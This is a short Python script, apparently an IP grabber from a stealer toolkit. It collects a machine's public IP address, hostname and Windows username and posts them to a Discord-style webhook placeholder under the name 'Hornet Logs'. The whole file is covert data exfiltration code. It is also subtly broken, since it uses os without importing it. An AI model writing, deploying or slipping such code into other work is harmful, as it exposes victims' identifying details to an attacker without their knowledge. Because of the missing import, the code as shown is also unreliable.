import requests
import json
import socket

ip = requests.get('https://api.ipify.org').text

desktop_name = socket.gethostname()
pc_name = os.getenv("UserName")

payload = {
    "embeds": [
        {
            "title": "IP Information",
            "description": f"IP Address: {ip}",
            "color": 16763904,
            "fields": [
                {
                    "name": "Desktop Name",
                    "value": desktop_name,
                    "inline": False
                },
                {
                    "name": "PC Name",
                    "value": pc_name,
                    "inline": False
                }
            ],
            "thumbnail": {
                "url": "https://cdn-icons-png.flaticon.com/512/4944/4944141.png"
            }
        }
    ],
    "username": "Hornet Logs",
    "avatar_url": "https://cdn-icons-png.flaticon.com/512/4944/4944141.png"
}

webhook_url = "WEBHOOK_HERE"

response = requests.post(webhook_url, json=payload)